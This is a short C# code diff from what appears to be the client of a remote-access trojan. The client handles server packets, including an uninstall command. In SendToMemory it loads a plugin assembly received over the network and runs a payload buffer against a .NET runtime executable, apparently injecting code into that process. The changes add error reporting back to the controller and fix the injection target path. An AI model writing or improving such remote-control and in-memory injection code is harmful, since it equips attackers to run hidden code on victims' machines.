@@ -22,7 +22,10 @@ namespace Client.Handle_Packet
                     new HandleUninstall();
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Packet.Error(ex);
+            }
         }
 
         public void SendToMemory(MsgPack unpack_msgpack)
@@ -53,12 +56,15 @@ namespace Client.Handle_Packet
                     {
                         Assembly loader = Assembly.Load(plugin);
                         MethodInfo meth = loader.GetType("Plugin.Program").GetMethod("Run");
-                        meth.Invoke(null, new object[] { buffer, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), injection) });
+                        meth.Invoke(null, new object[] { buffer, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection) });
                     })
                     { IsBackground = true }.Start();
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Packet.Error(ex);
+            }
         }
     }
 }
